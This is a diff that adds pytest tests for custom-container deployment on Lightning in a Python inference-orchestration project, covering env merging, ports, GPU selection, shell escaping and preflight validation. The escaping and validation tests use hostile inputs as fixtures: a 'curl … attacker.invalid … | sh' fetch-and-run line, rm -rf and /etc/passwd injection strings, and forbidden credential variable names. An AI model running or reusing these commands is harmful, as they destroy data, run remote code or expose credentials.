@@ -55,11 +55,17 @@ from inferweave.isolation.runner import _PASSTHROUGH_ENV
 from inferweave.models.deployment import DeploymentRequest
 from inferweave.models.profile import HealthcheckConfig
 from inferweave.providers import lightning_provider as lp
-from inferweave.providers.lightning_provider import LightningProvider, runtime_command
+from inferweave.providers.lightning_provider import (
+    LightningConfigurationError,
+    LightningCredentialError,
+    LightningProvider,
+    _uses_inferweave_worker,
+    runtime_command,
+)
 from inferweave.providers.router import ProviderRouter
 from inferweave.registry.base import ModelRegistry
 from inferweave.runtimes.base import RuntimeSpec
-from inferweave.runtimes.templates import get_runtime_template
+from inferweave.runtimes.templates import ContainerTemplate, get_runtime_template
 from inferweave.services.healthcheck_service import HealthcheckService
 from inferweave.services.lifecycle_service import LifecycleService
 from inferweave.services.provisioning_service import guard_runtime
@@ -166,7 +172,8 @@ class FakeRunner:
         if self.start_error is not None:
             raise self.start_error
         name = call.payload["name"]
-        urls = self.urls if self.urls is not None else [f"https://8080-{name}{HOST_SUFFIX}"]
+        port = call.payload.get("port", 8080)
+        urls = self.urls if self.urls is not None else [f"https://{port}-{name}{HOST_SUFFIX}"]
         return {"resource_id": "dep_" + name, "urls": urls}
 
     def _find(self, payload: dict[str, Any]) -> tuple[str, str] | None:
@@ -1708,3 +1715,588 @@ async def test_restart_attach_find_health_inference_stop_with_pooled_account(
     assert not runner.resources
     assert (await second.lifecycle_service.get_record(dep.id)).state == DeploymentState.STOPPED
     assert {c.account_id for c in runner.calls} == {"acct-b"}
+
+
+# --- T1.3c: Lightning custom container compatibility ---------------------------------------------
+
+
+def custom_container_profile(
+    *,
+    model_id: str = "custom-lightning-container",
+    image: str = "ghcr.io/org/custom-infer:1.4.2",
+    args: list[str] | None = None,
+    setup_commands: list[str] | None = None,
+    port: int = 9090,
+    healthcheck_path: str = "/v2/readyz",
+    container_env: dict[str, str] | None = None,
+    profile_env: dict[str, str] | None = None,
+    min_vram_gb: float = 20.0,
+    recommended_gpus: list[str] | None = None,
+    gpu_count: int = 1,
+    healthcheck: HealthcheckConfig | None = None,
+):
+    from inferweave.models.profile import HardwareRequirements, ModelProfile
+
+    return ModelProfile.for_container(
+        id=model_id,
+        image=image,
+        args=["/app/server", "--host", "0.0.0.0", "--port", str(port)] if args is None else args,
+        setup_commands=["echo preflight-1", "mkdir -p /tmp/model-cache"]
+        if setup_commands is None
+        else setup_commands,
+        port=port,
+        health_path=healthcheck_path,
+        env={"CONTAINER_VAR": "from-container", "SHARED_KEY": "from-container"}
+        if container_env is None
+        else container_env,
+        default_env={"PROFILE_VAR": "from-profile", "SHARED_KEY": "from-profile"}
+        if profile_env is None
+        else profile_env,
+        hardware=HardwareRequirements(
+            min_vram_gb=min_vram_gb,
+            recommended_gpus=recommended_gpus or ["L4", "A100-40GB", "H100"],
+            gpu_count=gpu_count,
+        ),
+        healthcheck=healthcheck,
+    )
+
+
+@pytest.mark.asyncio
+async def test_container_template_runtime_spec_preserved_in_lightning_provision(
+    provider, runner, ambient_env
+):
+    from inferweave.models.profile import HardwareRequirements
+
+    hc = HealthcheckConfig(
+        path="/v2/readyz",
+        port=9090,
+        method="HEAD",
+        expected_status_codes=[200, 204],
+        consecutive_successes=2,
+        headers={"X-Custom-Probe": "enabled"},
+    )
+    profile = custom_container_profile(
+        image="ghcr.io/org/custom-infer@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
+        port=9090,
+        healthcheck_path="/v2/readyz",
+        healthcheck=hc,
+    )
+    request = DeploymentRequest(
+        model=profile.id,
+        provider="lightning",
+        env={"REQUEST_VAR": "from-request", "SHARED_KEY": "from-request"},
+        custom_args={
+            "extra_cli_args": ["--workers", "4", "--model-name", "my model"],
+            "extra_env": {"OPTIONS_VAR": "from-options", "SHARED_KEY": "from-options"},
+            "lightning": {"min_replicas": 1, "max_replicas": 3, "idle_threshold_seconds": 120},
+        },
+    )
+    runtime = ContainerTemplate().render(profile, request)
+    # Override runtime.hardware to verify LightningProvider respects runtime.hardware over profile.hardware
+    runtime.hardware = HardwareRequirements(
+        min_vram_gb=70.0,
+        recommended_gpus=["H100"],
+        gpu_count=2,
+    )
+
+    account = ProviderAccount.ambient("lightning")
+    provider.preflight(request, profile, runtime, account)
+
+    deployment_id = provider.new_deployment_id(profile)
+    record = DeploymentRecord(
+        id=deployment_id,
+        model=profile.id,
+        provider="lightning",
+        account=account.id,
+        resource=provider.resource_ref(deployment_id, request, account),
+    )
+    result = await provider.provision(record, request, profile, runtime, account)
+
+    assert runner.ops() == ["whoami", "start"]
+    payload = runner.of("start")[0].payload
+    assert payload["image"] == profile.container.image
+    assert payload["port"] == 9090
+    assert payload["healthcheck_path"] == "/v2/readyz"
+    assert payload["machine"] == "H100_X_2"
+    assert payload["env"] == {
+        "CONTAINER_VAR": "from-container",
+        "PROFILE_VAR": "from-profile",
+        "REQUEST_VAR": "from-request",
+        "OPTIONS_VAR": "from-options",
+        "SHARED_KEY": "from-options",
+    }
+    assert (payload["min_replicas"], payload["max_replicas"]) == (1, 3)
+    assert payload["idle_threshold_seconds"] == 120
+    assert "/tmp/iw-runtime" not in payload["command"]
+
+    tokens = shlex.split(payload["command"])
+    assert tokens[0] == "-c"
+    script = tokens[1]
+    assert script == (
+        "set -eu && echo preflight-1 && mkdir -p /tmp/model-cache && "
+        "exec /app/server --host 0.0.0.0 --port 9090 --workers 4 --model-name 'my model'"
+    )
+    assert result.endpoint_url == f"https://9090-{record.id}{HOST_SUFFIX}"
+
+
+def test_machine_name_respects_runtime_hardware_and_skips_insufficient_vram_candidates():
+    from inferweave.models.profile import HardwareRequirements
+
+    profile = custom_container_profile(
+        min_vram_gb=16.0,
+        recommended_gpus=["L4", "H100"],
+        gpu_count=1,
+    )
+    request = DeploymentRequest(model=profile.id, provider="lightning")
+    runtime = ContainerTemplate().render(profile, request)
+    # T4 (16GB) and L4 (24GB) are smaller than 60GB, so candidate search must fall through to A100-80GB.
+    runtime.hardware = HardwareRequirements(
+        min_vram_gb=60.0,
+        recommended_gpus=["T4", "L4", "A100-80GB"],
+        gpu_count=1,
+    )
+    assert LightningProvider.machine_name(request, profile, runtime) == "A100_80GB"
+
+    # Explicit request overrides take precedence over runtime.hardware
+    override_req = DeploymentRequest(
+        model=profile.id, provider="lightning", gpu_type="H100", num_gpus=2
+    )
+    assert LightningProvider.machine_name(override_req, profile, runtime) == "H100_X_2"
+
+    # If all default candidates have insufficient VRAM, InsufficientVramError is raised
+    runtime.hardware = HardwareRequirements(
+        min_vram_gb=60.0,
+        recommended_gpus=["T4", "L4"],
+        gpu_count=1,
+    )
+    with pytest.raises(InsufficientVramError):
+        LightningProvider.machine_name(request, profile, runtime)
+
+
+@pytest.mark.parametrize("port", [80, 7001, 8080, 9090, 65535])
+@pytest.mark.asyncio
+async def test_dry_run_endpoint_uses_configured_port(
+    provider, runner, weave_factory, monkeypatch, port
+):
+    for name in ("LIGHTNING_API_KEY", "LIGHTNING_USER_ID", "LIGHTNING_TEAMSPACE"):
+        monkeypatch.delenv(name, raising=False)
+
+    profile = custom_container_profile(model_id=f"custom-port-{port}", port=port)
+    request = DeploymentRequest(model=profile.id, provider="lightning", dry_run=True)
+    runtime = ContainerTemplate().render(profile, request)
+
+    assert (
+        provider.dry_run_endpoint("iw-lightning-dry123", runtime)
+        == f"https://{port}-iw-lightning-dry123.cloudspaces.litng.ai"
+    )
+
+    weave = weave_factory(runner)
+    weave.register_model(profile)
+    dep = await weave.deploy(profile.id, provider="lightning", dry_run=True)
+    record = await weave.lifecycle_service.get_record(dep.id)
+    assert record.is_dry_run is True
+    assert dep.endpoint_url == f"https://{port}-{dep.id}.cloudspaces.litng.ai"
+    assert not runner.calls
+
+
+@pytest.mark.parametrize(
+    "run_args",
+    [
+        ["python", "-m", "inferweave.workers.image_server"],
+        ["python3", "-m", "inferweave.workers.wan_server", "--port", "8000"],
+        ["python3.12", "-u", "-m", "inferweave.workers.flux"],
+        ["/opt/conda/bin/python3", "-W", "ignore", "-X", "dev", "-um", "inferweave.workers.fish"],
+        ["python3", "-minferweave.workers.image_server", "--host", "0.0.0.0"],
+        ["/usr/bin/env", "python3", "-m", "inferweave.workers.image_server"],
+        ["env", "-u", "PYTHONHOME", "FOO=bar", "--", "python3", "-m", "inferweave.workers"],
+    ],
+)
+def test_worker_detection_matches_actual_python_inferweave_worker_modules(run_args):
+    assert _uses_inferweave_worker(run_args) is True
+    runtime = RuntimeSpec(
+        name="container",
+        docker_image="ghcr.io/org/custom:1.0",
+        run_command="",
+        run_args=run_args,
+    )
+    cmd = runtime_command(runtime)
+    assert "/tmp/iw-runtime" in cmd
+    assert 'export PYTHONPATH="/tmp/iw-runtime:${PYTHONPATH:-}"' in cmd
+
+
+@pytest.mark.parametrize(
+    "run_args",
+    [
+        ["/app/server", "--model", "inferweave.workers.image_server"],
+        ["/app/server", "-m", "inferweave.workers.image_server"],
+        ["echo", "inferweave.workers.image_server"],
+        ["python3", "serve.py", "-m", "inferweave.workers.image_server"],
+        ["python3", "-m", "vllm.entrypoints.openai.api_server", "--model", "inferweave.workers.flux"],
+        ["python3", "-m", "inferweave.cli", "inferweave.workers.image_server"],
+        ["python3", "-m", "other_pkg.inferweave.workers.image_server"],
+        ["python3", "-m", "inferweave.workers.bad;rm"],
+        ["python3", "-c", "import sys", "-m", "inferweave.workers.image_server"],
+        ["python3", "--", "-m", "inferweave.workers.image_server"],
+        ["/usr/bin/env", "-u", "PYTHONPATH"],
+        ["python3", "-W", "ignore"],
+    ],
+)
+def test_worker_detection_ignores_arbitrary_argv_matches(run_args):
+    assert _uses_inferweave_worker(run_args) is False
+    runtime = RuntimeSpec(
+        name="container",
+        docker_image="ghcr.io/org/custom:1.0",
+        run_command="",
+        run_args=run_args,
+    )
+    cmd = runtime_command(runtime)
+    assert "/tmp/iw-runtime" not in cmd
+    assert 'export PYTHONPATH="/tmp/iw-runtime:${PYTHONPATH:-}"' not in cmd
+
+
+def test_builtin_runtimes_preserve_lightning_command_behavior():
+    registry = ModelRegistry()
+    # vLLM uses vllm.entrypoints.openai.api_server -> should NOT bootstrap inferweave.workers
+    vllm_profile = registry.get("meta-llama/Meta-Llama-3-8B-Instruct")
+    vllm_req = DeploymentRequest(model=vllm_profile.id, provider="lightning")
+    vllm_rt = get_runtime_template(vllm_profile.default_runtime).render(vllm_profile, vllm_req)
+    vllm_cmd = runtime_command(vllm_rt)
+    assert "/tmp/iw-runtime" not in vllm_cmd
+    assert "vllm.entrypoints.openai.api_server" in vllm_cmd
+
+    # fish-speech-s2 uses /app/.venv/bin/python -m tools.server.api_server (or tools/api_server.py), not inferweave.workers -> no bootstrap
+    fish_profile = registry.get(AUDIO_MODEL)
+    fish_req = DeploymentRequest(model=fish_profile.id, provider="lightning")
+    fish_rt = get_runtime_template(fish_profile.default_runtime).render(fish_profile, fish_req)
+    fish_cmd = runtime_command(fish_rt)
+    assert "/tmp/iw-runtime" not in fish_cmd
+    assert "/app/checkpoints/s2-pro" in fish_cmd
+
+    # flux-diffusers and wan-video use python3 -m inferweave.workers.* -> MUST bootstrap
+    for model_id in (IMAGE_MODEL, "wan-video/wan-2.1"):
+        prof = registry.get(model_id)
+        req = DeploymentRequest(model=prof.id, provider="lightning")
+        rt = get_runtime_template(prof.default_runtime).render(prof, req)
+        cmd = runtime_command(rt)
+        assert "/tmp/iw-runtime" in cmd
+        assert 'export PYTHONPATH="/tmp/iw-runtime:${PYTHONPATH:-}"' in cmd
+
+
+def test_container_shell_safe_argv_ignores_run_command_and_escapes_metacharacters():
+    adversarial_args = [
+        "/opt/bin/custom-server",
+        "--prompt",
+        "hello; rm -rf / && $(whoami) `id` | cat /etc/passwd",
+        "--env-literal",
+        "$HOME ${USER} *.py ? [a-z]",
+        "--quotes",
+        """single'quote and "double" quote\nand newline""",
+    ]
+    profile = custom_container_profile(
+        args=adversarial_args[:3],
+        setup_commands=["echo setup-ok"],
+    )
+    request = DeploymentRequest(
+        model=profile.id,
+        provider="lightning",
+        custom_args={"extra_cli_args": adversarial_args[3:]},
+    )
+    runtime = ContainerTemplate().render(profile, request)
+    # Tamper with legacy run_command to ensure Lightning ignores it completely
+    runtime.run_command = "curl https://attacker.invalid/pwn | sh"
+
+    rendered = runtime_command(runtime)
+    assert "attacker.invalid" not in rendered
+    outer = shlex.split(rendered)
+    assert outer[0] == "-c"
+    parts = outer[1].split(" && ", 2)
+    assert parts[0] == "set -eu"
+    assert parts[1] == "echo setup-ok"
+    assert parts[2].startswith("exec ")
+    parsed_argv = shlex.split(parts[2][len("exec ") :])
+    assert parsed_argv == adversarial_args
+
+
+def test_empty_container_args_allowed_when_extra_cli_args_provides_argv(provider, ambient_env):
+    profile = custom_container_profile(args=[])
+    request = DeploymentRequest(
+        model=profile.id,
+        provider="lightning",
+        custom_args={"extra_cli_args": ["/app/entrypoint", "--port", "9090"]},
+    )
+    runtime = ContainerTemplate().render(profile, request)
+    provider.preflight(request, profile, runtime, ProviderAccount.ambient("lightning"))
+    cmd = runtime_command(runtime)
+    assert "exec /app/entrypoint --port 9090" in cmd
+
+
+@pytest.mark.parametrize(
+    "mutator,expected_exc,match",
+    [
+        (
+            lambda rt: setattr(rt, "run_args", []),
+            LightningConfigurationError,
+            "non-empty command argv",
+        ),
+        (
+            lambda rt: (setattr(rt, "run_args", []), setattr(rt, "run_command", "python app.py")),
+            LightningConfigurationError,
+            "non-empty command argv",
+        ),
+        (
+            lambda rt: setattr(rt, "run_args", ["   ", "--flag"]),
+            LightningConfigurationError,
+            "argv\\[0\\]",
+        ),
+        (
+            lambda rt: setattr(rt, "run_args", ["FOO=bar", "python3", "app.py"]),
+            LightningConfigurationError,
+            "not a shell variable assignment",
+        ),
+        (
+            lambda rt: setattr(rt, "run_args", ["python3", 123]),
+            LightningConfigurationError,
+            "must be a string",
+        ),
+        (
+            lambda rt: setattr(rt, "setup_commands", ["echo ok", 42]),
+            LightningConfigurationError,
+            "setup_commands must be a list of strings",
+        ),
+        (
+            lambda rt: setattr(rt, "port", 0),
+            LightningConfigurationError,
+            "runtime.port must be an integer from 1 to 65535",
+        ),
+        (
+            lambda rt: setattr(rt, "port", -80),
+            LightningConfigurationError,
+            "runtime.port must be an integer from 1 to 65535",
+        ),
+        (
+            lambda rt: setattr(rt, "port", 65536),
+            LightningConfigurationError,
+            "runtime.port must be an integer from 1 to 65535",
+        ),
+        (
+            lambda rt: setattr(rt, "port", True),
+            LightningConfigurationError,
+            "runtime.port must be an integer from 1 to 65535",
+        ),
+        (
+            lambda rt: setattr(rt, "port", "8080"),
+            LightningConfigurationError,
+            "runtime.port must be an integer from 1 to 65535",
+        ),
+        (
+            lambda rt: setattr(rt, "port", 8081),
+            LightningConfigurationError,
+            "must match",
+        ),
+        (
+            lambda rt: setattr(rt, "docker_image", "   "),
+            LightningConfigurationError,
+            "non-empty container image",
+        ),
+        (
+            lambda rt: setattr(rt, "docker_image", "docker:"),
+            LightningConfigurationError,
+            "non-empty container image",
+        ),
+        (
+            lambda rt: setattr(rt, "docker_image", "ghcr.io/org/bad image:latest"),
+            LightningConfigurationError,
+            "without whitespace",
+        ),
+        (
+            lambda rt: setattr(rt, "add_python", "3.12; rm -rf /"),
+            LightningConfigurationError,
+            "Invalid Python version string",
+        ),
+        (
+            lambda rt: setattr(rt, "healthcheck_path", "   "),
+            LightningConfigurationError,
+            "healthcheck_path must be a non-empty string",
+        ),
+        (
+            lambda rt: setattr(rt, "healthcheck_path", "/health check"),
+            LightningConfigurationError,
+            "healthcheck_path must be a non-empty string",
+        ),
+        (
+            lambda rt: rt.env_vars.__setitem__("LIGHTNING_API_KEY", "dummy-key"),
+            LightningCredentialError,
+            "forbidden",
+        ),
+        (
+            lambda rt: rt.env_vars.__setitem__("MODAL_TOKEN_SECRET", "dummy-modal"),
+            LightningCredentialError,
+            "forbidden",
+        ),
+        (
+            lambda rt: rt.env_vars.__setitem__("AWS_SECRET_ACCESS_KEY", "dummy-aws"),
+            LightningCredentialError,
+            "forbidden",
+        ),
+        (
+            lambda rt: rt.setup_commands.append("export LIGHTNING_API_KEY=leak"),
+            LightningCredentialError,
+            "forbidden",
+        ),
+        (
+            lambda rt: rt.run_args.append("LIGHTNING_USER_ID=leak"),
+            LightningCredentialError,
+            "forbidden",
+        ),
+    ],
+)
+@pytest.mark.asyncio
+async def test_invalid_container_runtime_rejected_before_any_cloud_or_dry_run_operation(
+    provider, runner, ambient_env, mutator, expected_exc, match
+):
+    profile = custom_container_profile()
+    account = ProviderAccount.ambient("lightning")
+
+    for dry_run in (False, True):
+        req = DeploymentRequest(model=profile.id, provider="lightning", dry_run=dry_run)
+        rt = ContainerTemplate().render(profile, req)
+        mutator(rt)
+        with pytest.raises(expected_exc, match=match):
+            provider.preflight(req, profile, rt, account)
+        assert not runner.calls
+
+    req = DeploymentRequest(model=profile.id, provider="lightning")
+    rt = ContainerTemplate().render(profile, req)
+    mutator(rt)
+    deployment_id = provider.new_deployment_id(profile)
+    record = DeploymentRecord(
+        id=deployment_id,
+        model=profile.id,
+        provider="lightning",
+        account=account.id,
+        resource=provider.resource_ref(deployment_id, req, account),
+        creation_may_continue=True,
+    )
+    with pytest.raises(expected_exc, match=match):
+        await provider.provision(record, req, profile, rt, account)
+    assert not runner.calls
+    assert record.resource.owned is False
+    assert record.creation_may_continue is False
+
+
+@pytest.mark.asyncio
+async def test_invalid_custom_container_through_sdk_does_not_penalize_account_or_call_worker(
+    runner, weave_factory, tmp_path
+):
+    manager = pool_manager(tmp_path)
+    weave = weave_factory(runner, accounts=manager)
+    empty_argv_profile = custom_container_profile(model_id="empty-argv-container", args=[])
+    weave.register_model(empty_argv_profile)
+
+    for dry_run in (True, False):
+        with pytest.raises(LightningConfigurationError, match="non-empty command argv"):
+            await weave.deploy(empty_argv_profile.id, provider="lightning", dry_run=dry_run)
+        assert not runner.calls
+        assert await weave.list_records() == []
+
+    for health in weave.account_health():
+        assert health.consecutive_failures == 0
+
+
+@pytest.mark.asyncio
+async def test_custom_container_end_to_end_deploy_probe_lifecycle_and_stop(
+    runner, weave_factory, tmp_path
+):
+    from test_endpoint_auth import HeaderRecordingProbe
+
+    probe = HeaderRecordingProbe()
+
+    hc = HealthcheckConfig(
+        path="/v2/readyz",
+        port=9090,
+        initial_delay_seconds=0.0,
+        timeout_seconds=0.5,
+        probe_interval_seconds=0.01,
+        method="HEAD",
+        expected_status_codes=[200, 204],
+        consecutive_successes=2,
+        headers={"X-Custom-Probe": "probe-token-ok"},
+    )
+    profile = custom_container_profile(
+        model_id="custom-llm-container",
+        port=9090,
+        healthcheck_path="/v2/readyz",
+        healthcheck=hc,
+    )
+
+    weave = weave_factory(runner, accounts=pool_manager(tmp_path), probe=probe)
+    weave.register_model(profile)
+
+    dep = await weave.deploy(
+        profile.id,
+        provider="lightning",
+        account="acct-a",
+        env={"CUSTOM_MODE": "strict"},
+        custom_args={
+            "extra_cli_args": ["--max-batch", "16"],
+            "lightning": {"min_replicas": 1, "max_replicas": 2, "idle_threshold_seconds": 60},
+        },
+    )
+
+    assert dep.state == DeploymentState.HEALTHY
+    assert dep.account == "acct-a"
+    assert dep.endpoint_url == f"https://9090-{dep.id}{HOST_SUFFIX}"
+
+    start = runner.of("start")[0]
+    assert start.account_id == "acct-a"
+    assert start.secrets == ACCOUNT_SECRETS["acct-a"]
+    assert start.payload["port"] == 9090
+    assert start.payload["healthcheck_path"] == "/v2/readyz"
+    assert start.payload["image"] == profile.container.image
+    assert start.payload["env"]["CUSTOM_MODE"] == "strict"
+    assert (start.payload["min_replicas"], start.payload["max_replicas"]) == (1, 2)
+    assert start.payload["idle_threshold_seconds"] == 60
+    assert "/tmp/iw-runtime" not in start.payload["command"]
+
+    # Both custom healthcheck header and Lightning Bearer auth reached the readiness probe
+    assert probe.headers_seen
+    for seen_headers in probe.headers_seen:
+        assert seen_headers.get("Authorization") == "Bearer SENTINEL-key-a"
+        assert seen_headers.get("X-Custom-Probe") == "probe-token-ok"
+
+    assert (await dep.check_health()).is_healthy
+    assert (await dep.refresh()).state == DeploymentState.HEALTHY
+
+    record = await weave.lifecycle_service.get_record(dep.id)
+    expect_affinity(runner, dep, record)
+    dump = record.model_dump_json()
+    for secret in ACCOUNT_SECRETS["acct-a"].values():
+        assert secret not in dump
+
+    await dep.stop()
+    assert not runner.resources
+    assert (await weave.lifecycle_service.get_record(dep.id)).state == DeploymentState.STOPPED
+
+
+@pytest.mark.asyncio
+async def test_custom_container_readiness_failure_cleans_resources(
+    runner, weave_factory, ambient_env
+):
+    hc = HealthcheckConfig(
+        path="/v2/readyz",
+        port=9090,
+        initial_delay_seconds=0.0,
+        timeout_seconds=0.05,
+        probe_interval_seconds=0.01,
+    )
+    profile = custom_container_profile(
+        model_id="custom-failing-readiness",
+        port=9090,
+        healthcheck_path="/v2/readyz",
+        healthcheck=hc,
+    )
+    weave = weave_factory(runner, probe=MockHealthcheckProbeAdapter(default_healthy=False))
+    weave.register_model(profile)
+    with pytest.raises(HealthcheckTimeoutError):
+        await weave.deploy(profile.id, provider="lightning")
+    await assert_failed_deployment_cleaned(weave, runner)
